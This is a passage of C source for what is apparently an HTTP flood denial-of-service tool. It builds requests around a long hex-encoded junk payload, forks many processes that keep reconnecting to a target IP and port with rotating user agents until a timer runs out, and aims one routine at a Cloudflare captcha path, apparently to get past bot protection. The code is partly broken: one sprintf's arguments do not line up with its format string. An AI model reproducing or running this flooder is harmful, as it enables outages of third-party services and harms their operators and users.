x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x74\x74\x6D\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x74\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x7F\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x67\x62\x67\x62\x67\x62\x67\x62\x67\x62\x67\x62\x2C"
       "\x4A\x59\x4F\x47\x42\x4A\x43\x54\x6D\x6F\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x5F\x59\x4F\x5F\x59\x4F\x59\x5F\x59\x4F\x59\x59\x5F\x59\x59\x4F\x59\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x42\x49\x49\x58\x44\x4D\x54\x2C");
	for (i = 0; i < power; i++) {
		sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, hex_payload, host, useragents[(rand() % 7)]);
		if (fork()) {
			while (end > time(NULL)) {
				socket = socket_connect(host, port);
				if (socket != 0) {
					write(socket, request, strlen(request));
					read(socket, buffer, 1);
					close(socket);
				}
			}
			exit(0);
		}
	}
}
void sendHTTPtwo(char *method, char *host, int port, int timeEnd, int power) {
	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
	char request[512], buffer[1], hex_3payload[2048];
	sprintf(hex_3payload, "\x0");
	for (i = 0; i < power; i++) {
		sprintf(request, "%s /cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, hex_3payload, host, useragents[(rand() % 36)]);
		if (fork()) {
			while (end > time(NULL)) {
				socket = socket_connect(host, port);
				if (socket != 0) {
					write(socket, request, strlen(request));
					read(socket, buffer, 1);
					close(socket);
				}
			}
			exit(0);
		}
	}
}

int main(int argc, char **argv)
{
    if(argc != 6)
    {
        printf("Failed\nExample: %s METHODS[GET/POST/HEAD] IP PORT TIME CONNECTIONS\n", argv[0]);
        printf("Connections = open sockets\n", argv[0]);
        exit(0);
    }
    SendHTTPHex(argv[1], argv[2], atoi(argv[3]), atoi(argv[4]), atoi(argv[5]));
    sendHTTPtwo(argv[1], argv[2], atoi(argv[3]), atoi(argv[4]), atoi(argv[5]));
};